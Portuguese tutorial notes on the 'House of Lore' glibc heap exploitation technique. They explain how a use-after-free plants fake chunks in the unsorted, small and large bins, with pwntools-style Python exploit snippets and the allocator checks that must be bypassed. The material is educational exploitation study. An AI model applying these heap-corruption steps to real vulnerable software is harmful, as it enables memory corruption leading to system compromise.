# House of Lore

- [House of Lore](#house-of-lore)
- [UnsortedBin](#unsortedbin)
  - [Ataque](#ataque)
  - [Obs](#obs)
- [Small Bins](#small-bins)
  - [Obs](#obs-1)
- [Large bins](#large-bins)


Na house of Lore vamos colocar um chunk falso no UnsortedBin, SmallBins ou LargeBins.

Porem, nao iremos chamar `free()` no chunk falso (como na House 
of Spirit) ou um double free (como no fastbin dup).

Esse foi um dos ataques do malloc malleficarium

# UnsortedBin
> Versão < 2.29
Para a HoL nos unsortedbins, precisamos de um `write-after-free` em um chunk 
dos unsorted bins.... Seja isso por meio de um overflow, ou o programa 
permitindo alterar chunks livres...

Isso deve te lembrar do Partial Unlink nos Unsorted Bins e da House of Orange.
Porem, nesses casos a parte importante era o write na hora da alocação, e nao 
a alocação em si, com na HoO ate usando o crash mitigação nessa alocação ao
nosso favor.

Porem neses caso, nos queremos que o chunk seja usável quando nos alocamos e 
que o programa nao crash... então precisaremos mudar um pouco a estrategia ...

## Ataque
Nos podemos usar o UAF no chunk do heap para alterar o bk, da mesma maneira que 
faríamos com o ataque dos unsortedbins...

Assim, vamos supor que o chunk falso sera criado no `username` (armazenado na 
`data` section)

```py
change_username(flat(
    0,
    0xc1,# size
    0,#fd
    0,#bk
)) 

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))
```
Assim, o unsorted bin fica:
> head bk: chunk_A -> username -> 0 
Em seguida, nos poderíamos alocar o chunk_A e sem seguida o nosso chunk falso

Porem, durante a alocação desses chunks, um ataque do unsorted bin acidental 
ocorreria, ok se mostra ok no caso do chunk_A, pois aponta para memoria valida 
( a data section aonde o chunk falso fica)

Entretanto, no caso do chunk falso, ele tentaria fazer um ataque dos 
unsortedbins em `0 + 0x10`, memoria invalida: SEGFAULT!!!!

Assim, nos precisamos garantir que o bk do chunk falso aponta para memoria 
escrevível! A solução mais fácil é aponta-lo para ele mesmo, corrompendo os 
8 bytes inúteis antes do size

```py
change_username(flat(
    0,
    0xc1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 
```
Agora basta realizar um malloc com o size do chunk falso, e 
pronto! Nos temos um chunk na data section (ou aonde vc criou o 
chunk falso)

```py
free(chunk_A)

change_username(flat(
    0,
    0xc1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
))  

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))

chunk_FAKE = malloc(0xb8)
```



## Obs
Como nos controlamos o bk do chunk falso, podemos apontar para outro chunk 
falso, ou ate pra ele mesmo contanto que voce nao danifique o bk entre 
alocações :D

Voce pode ter pode ter a 8 flag acidentalmente ligada que nao interfere

O size precisa < do que system_mem

o bk do chunk falso precisa apontar para memoria escrevível

Quando tentar encontrar sizes que ocorrem naturalmente, eles PODEM nao estar 
alinhados

# Small Bins
O ataque contra os smalls bins é bem semelhante ao dos unsorted 
bins, porem nos precisamos que antes do UAF para corromper os 
pointers, nos coloquemos (sort) o chunk no small bins...

Para isto basta executar um malloc que nao o aloque... por 
exemplo, caso o seu chunk seja de size `0xb0`, basta alocar um de 
tamanho >= `0xc0`

> Lembrando que tem outros métodos de dar SORT no chunk, 
> explicados na parte de teoria

Assim o UAF, ira corromper meta dados de smallbin, e nao de 
unsortedbin :D

Os small bins também usam um parcial unlink, então nos podemos 
ignorar o fd

```py
change_username(flat(
    0,
    0xb1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))
```
Por conta de de os small bins nao terem verificação no tamanho do 
chunk, voce pode colocar qualquer valor....

```py
chunk_A = malloc(0x98)
malloc(0x18) #  Previvir consolidação com o TOP

free(chunk_A)

change_username(flat(
    0,
    0x00,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 

malloc( TAMANHO DIFERENTE DO CHUNK_A ) # sort chunk_A -> Small

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
```
Lembrando que o bk do chunk_fake ainda precisa apontar para 
memoria valida e que o voce precisa de um chunk APOS o do UAF para evitar 
consolidação com o top chunk.

Por ultimo, temos que enfrentar a mitigação do partial unlink duas 
vezes: quando alocar o chunk_fake e quando alocar o chunk_A 
- o chunk_fake.fd precisa apontar para o chunk_A: chunk_A.bk -> 
  chunk_fake.fd -> chunk_A
- o chunk_fake.bk + 0x10 precisa apontar para o chunk_fake

Assim, nos precisaremos de um heap leak do endereço do chunk_A !

```py
change_username(flat(
    elf.sym.username,
    0x00,# size
    leak_chunk_A,#fd
    elf.sym.username - 0x10,#bk
)) 
```
e pronto! alocamos um chunk falso :D

## Obs
Mais difícil que o unsorted bins

Precisa de heap leak

Nao precisa ficar alinhado

Nao precisa de size correto

Pode fazer o mesmo coiso de apontar o bk do chunk_fake para outro 
chunk falso e assim por diante...

# Large bins
Para os largebins, podemos tanto atacar um skipchunk quanto um normal, portanto 
a diferença é que para skipchunks, vamos corromper o `bk_nextsize` e para 
os normais o `fd`

Vamos começar pelos normais

Por ser um safe unlink, nosso chunk precisara passar pelos checks 
relacionados.

Alem disso malloc checa se `size == fd->size`, então o chunk falso e o chunk 
do UAF precisam ter o mesmo tamanho e possuir as mesmas flags (ex: 0x401)! 
(macro: `CHUNKSIZE_NOMASK`)

- fake size = uaf size
- fd e bk validos safe unlink
  - chunk.fd.bk -> chunk
  - chunk.bk.fd -> chunk
  - Basta colocar os 2 como o endereço do chunk falso 
- fd_nextsize = 0
  - se ele for NULL, o chunk **NAO** sera considerado skip 
  - se fd_nextsize != 0 e GLIBC > 2.21:
  - fd_nextsize e bk_nextsize precisariam passar safe unlink
- E por ultimo, o chunk do UAF nao pode ser o ultimo do largebin

Seguindo o exemplo do user:

```py
chunk_A = malloc(0x3f8)
malloc(0x18) # Previvir consolidação A B
chunk_B = malloc(0x3f8)
malloc(0x18) #  Previvir consolidação B TOP

free(chunk_A)
free(chunk_B)

change_username(flat(
    0,
    0x401,#size
    elf.sym.username,#fd
    elf.sym.username,#bk
    0,#fd_nextsize
    0,#bk_nextsize
)) 

malloc( 0x418 ) # sort chunk_A -> large 0x400

edit_chunk_A(p64(elf.sym.username))# UAF Corromper fd

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
```

Agora, para fazer o mesmo ataque por meio do `bk_nextsize`, basta trocar por:
```py
edit_chunk_A(flat(0,0,0,elf.sym.username))# UAF Corromper bk_nextsize
```
Alem disso, nao precisamos do chunk_B, com o chunk do UAF podendo ser o ultimo.

```py
chunk_A = malloc(0x3f8)
malloc(0x18) # Previvir consolidação A B
chunk_B = malloc(0x3f8)
malloc(0x18) #  Previvir consolidação B TOP

free(chunk_A)
free(chunk_B)

change_username(flat(
    0,
    0x401,#size
    elf.sym.username,#fd
    elf.sym.username,#bk
    0,#fd_nextsize
    0,#bk_nextsize
)) 

malloc( 0x418 ) # sort chunk_A -> large 0x400

edit_chunk_A(flat(0,0,0,elf.sym.username))# UAF Corromper bk_nextsize

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
```